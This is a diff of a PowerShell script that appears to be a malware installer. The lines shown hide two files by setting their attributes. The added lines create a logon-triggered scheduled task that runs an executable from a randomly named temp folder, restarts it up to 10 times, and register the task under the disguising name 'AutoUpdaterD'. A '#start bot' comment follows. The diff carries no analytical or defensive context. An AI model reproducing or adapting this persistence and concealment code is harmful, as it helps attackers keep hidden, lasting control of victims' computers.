@@ -37,22 +37,24 @@ Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attribute
 # Hide second file
 Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)
 
+$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.exe'
+$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
+$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
+
+
+#create startup task
 $taskXml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2023-08-09T11:59:58.6674267</Date>
     <Author>$env:computername\$env:username</Author>
-    <URI>\AutoUpdaterD</URI>
+    <URI>\AutoUpdateD</URI>
   </RegistrationInfo>
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
     </LogonTrigger>
-    <SessionStateChangeTrigger>
-      <Enabled>true</Enabled>
-      <StateChange>SessionUnlock</StateChange>
-    </SessionStateChangeTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
@@ -62,7 +64,7 @@ $taskXml = @"
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
@@ -98,9 +100,11 @@ $taskXml = @"
 </Task>
 "@
 
+
 $taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")
 
 Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force
+	
 
 
 #start bot
